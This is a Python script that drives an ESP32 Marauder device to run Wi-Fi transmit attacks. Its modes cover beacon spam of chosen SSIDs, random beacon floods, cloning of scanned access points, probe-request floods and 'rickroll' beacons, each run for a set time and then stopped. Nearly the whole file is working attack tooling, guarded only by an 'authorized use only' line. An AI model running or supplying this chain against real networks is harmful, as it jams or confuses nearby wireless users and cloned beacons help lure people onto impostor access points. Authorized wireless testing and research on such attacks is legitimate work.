#!/usr/bin/env python3
"""
beacon_probe.py -- beacon/probe transmit chain with several modes.

Builds the SSID list the mode needs, launches the transmit, times it, and cleans
up with stopscan -- one command instead of the manual list-building + attack +
stop dance. All Marauder v1.13.0 primitives.

Modes:
  beacon-list    add your SSIDs -> attack -t beacon -l   (spam a named list)
  beacon-random  attack -t beacon -r                     (random SSID flood)
  beacon-clone   scanap -> attack -t beacon -a           (clone scanned APs)
  probe          build SSID list -> attack -t probe      (probe-request flood)
  rickroll       attack -t rickroll                      (the classic)

  python3 chains/beacon_probe.py --mode beacon-list --ssids "FreeWiFi,Guest,Lobby" --duration 60
  python3 chains/beacon_probe.py --mode beacon-random --duration 45
  python3 chains/beacon_probe.py --mode beacon-clone --scan-seconds 20 --duration 60
  python3 chains/beacon_probe.py --mode probe --count 30 --duration 45

ACTIVE TRANSMISSION -- AUTHORIZED USE ONLY.
"""

import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from marauder import add_common_args, connect_from_args  # noqa: E402


def load_ssids(args):
    names = []
    if args.ssids:
        names += [s.strip() for s in args.ssids.split(",") if s.strip()]
    if args.ssid_file:
        with open(args.ssid_file, encoding="utf-8") as f:
            names += [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]
    return names


def main():
    ap = argparse.ArgumentParser(description="Beacon/probe transmit chain")
    add_common_args(ap)
    ap.add_argument("--mode", required=True,
                    choices=["beacon-list", "beacon-random", "beacon-clone", "probe", "rickroll"])
    ap.add_argument("--ssids", help="comma-separated SSIDs (beacon-list / probe)")
    ap.add_argument("--ssid-file", help="file of SSIDs, one per line (beacon-list / probe)")
    ap.add_argument("--count", type=int, default=20,
                    help="random SSIDs to generate when no list is given (probe; default 20)")
    ap.add_argument("--scan-seconds", type=int, default=20, help="scan duration for beacon-clone (default 20)")
    ap.add_argument("--duration", type=int, default=60, help="transmit duration in seconds (default 60)")
    args = ap.parse_args()

    m = connect_from_args(args)
    try:
        if args.mode == "beacon-list":
            names = load_ssids(args)
            if not names:
                print("[!] beacon-list needs --ssids or --ssid-file."); return
            m.send("clearlist -s")
            for n in names:
                m.send("ssid -a -n {}".format(n))
            m.send("list -s")
            print("\n[*] Beacon-spamming {} SSIDs for {}s ...".format(len(names), args.duration))
            m.send("attack -t beacon -l")

        elif args.mode == "beacon-random":
            print("\n[*] Random beacon flood for {}s ...".format(args.duration))
            m.send("attack -t beacon -r")

        elif args.mode == "beacon-clone":
            print("\n[*] Scanning {}s to clone APs ...".format(args.scan_seconds))
            aps = m.scan_aps(args.scan_seconds)
            for a in aps:
                print("      " + str(a))
            if not aps:
                print("[!] No APs to clone."); return
            print("\n[*] Beaconing clones of {} APs for {}s ...".format(len(aps), args.duration))
            m.send("attack -t beacon -a")

        elif args.mode == "probe":
            names = load_ssids(args)
            m.send("clearlist -s")
            if names:
                for n in names:
                    m.send("ssid -a -n {}".format(n))
            else:
                m.send("ssid -a -g {}".format(args.count))
            m.send("list -s")
            print("\n[*] Probe-request flood for {}s ...".format(args.duration))
            m.send("attack -t probe")

        elif args.mode == "rickroll":
            print("\n[*] Rickroll beacons for {}s ...".format(args.duration))
            m.send("attack -t rickroll")

        m.sleep(args.duration)
        m.stop()
        print("[*] Transmit stopped.")
    except KeyboardInterrupt:
        print("\n[interrupted]")
    finally:
        m.close()


if __name__ == "__main__":
    main()
